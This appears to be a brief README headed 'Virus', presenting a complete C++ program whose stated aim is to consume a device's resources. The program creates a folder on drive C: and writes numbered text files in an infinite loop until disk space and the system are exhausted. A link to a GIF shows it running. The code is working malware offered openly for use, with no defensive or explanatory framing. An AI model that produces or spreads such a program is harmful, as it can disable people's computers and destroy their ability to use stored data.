# Virus
Idea &rarr; Duplicate a file on the device infinitely, and this consumes the device's resources to the maximum.
```c
#include <bits/stdc++.h>
#include <direct.h>
using namespace std;

int main() {

    long long indexFile = 0;
    char const* path = "C:\\Diphro\\";
    _mkdir(path);

    while (true) {
        indexFile++;
        ofstream file (path + to_string(indexFile) +".txt");
    }
}
```
## Run
![Alt text](/images/virus.gif)

